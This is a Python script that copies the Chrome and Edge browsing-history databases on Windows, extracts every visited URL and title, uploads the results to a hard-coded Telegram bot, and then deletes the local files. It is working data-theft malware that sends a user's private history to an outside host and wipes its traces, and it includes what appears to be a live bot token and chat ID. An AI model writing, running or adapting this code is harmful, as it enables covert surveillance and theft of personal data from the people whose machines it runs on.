import os
import shutil
import sqlite3
import sys
import time
import requests, json

def get_edge_history_path():
    """Determines the default Edge History file path based on the OS."""
    home = os.path.expanduser("~")
    if sys.platform.startswith("win"):
        return os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
    else:
        raise OSError("Unsupported operating system.")

def get_chrome_history_path():
    """Determines the default Chrome History file path based on the OS."""
    home = os.path.expanduser("~")
    if sys.platform.startswith("win"):
        return os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
    else:
        raise OSError("Unsupported operating system.")

def process_browser_history(history_path, browser_name):
    """Helper function to read database and output file if browser history exists."""
    if not os.path.exists(history_path):
        print(f"Skipping: {browser_name} history file not found.")
        return False

    temp_db = f"{browser_name.lower()}_history_temp.db"
    output_file = f"{browser_name.lower()}_history_output.txt"
    
    conn = None  # Initialize connection variable outside try block
    try:
        # Copy file to prevent database locked errors
        shutil.copyfile(history_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Chronological True History Query (3 items selected)
        query = """
        SELECT urls.url, urls.title, visits.visit_time 
        FROM visits 
        JOIN urls ON visits.url = urls.id 
        ORDER BY visits.visit_time DESC;
        """
        cursor.execute(query)
        results = cursor.fetchall()
        
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(f"{'Title':<50} | {'URL'}\n")
            f.write("-" * 100 + "\n")
            
            # FIXED: Unpacking exactly 3 variables to match the SELECT query above
            for url, title, visit_time in results:
                display_title = title if title else "No Title"
                line = f"{display_title:<50} | \n{url}\n\n"
                f.write(line)
        
        print(f"Success: extracted {browser_name} history to {output_file}")
        cursor.close()
    except Exception as e:
        print(f"An error occurred while processing {browser_name}: {e}")
    finally:
        # FIXED: Explicitly close the database connection first
        if conn:
            conn.close()
        
        # Now Windows will safely allow you to remove the temp file
        if os.path.exists(temp_db):
            os.remove(temp_db)
                
    return False

def fetch_history():
    # Process Chrome
    try:
        chrome_path = get_chrome_history_path()
        process_browser_history(chrome_path, "Chrome")
    except OSError as e:
        print(e)

    # Process Edge
    try:
        edge_path = get_edge_history_path()
        process_browser_history(edge_path, "Edge")
    except OSError as e:
        print(e)

if __name__ == "__main__":
    fetch_history()
    TOKEN = '8683412588:AAGgmtFQqw7En-nIe0pgNGFUGvfBBup_3UI'
    CHAT_ID = '-5455393172'
    url = f"https://api.telegram.org/bot{TOKEN}/sendMediaGroup"

# Check all potential output paths
    possible_paths = ["edge_history_output.txt", "chrome_history_output.txt"]
    
    # Only include files that actually exist
    file_paths = [path for path in possible_paths if os.path.exists(path)]

    # If no history files were generated at all, stop here
    if not file_paths:
        print("Error: No browser history files were found to send.")
        sys.exit()

    files = {}
    media = []

    # Open the existing files and map them correctly
    for i, path in enumerate(file_paths):
        file_key = f"doc_{i}"  # Dynamic key for Telegram
        
        # Open the file in binary mode
        files[file_key] = open(path, 'rb')
        
        # The 'media' string MUST point exactly to 'attach://<file_key>'
        media.append({
            'type': 'document',
            'media': f'attach://{file_key}'
        })

    payload = {
        'chat_id': CHAT_ID,
        'media': json.dumps(media)  # Converts the list to a JSON string
    }

    try:
        # Send the POST request
        response = requests.post(url, data=payload, files=files)
        
        if response.status_code == 200:
            print("Available files sent successfully!")
        else:
            print(f"Telegram Error: {response.text}")

    finally:
        # Crucial: Always close the files so windows/linux releases them
        for f in files.values():
            f.close()

    # Clean up whatever files were actually created
    for path in file_paths:
        if os.path.exists(path):
            os.remove(path)

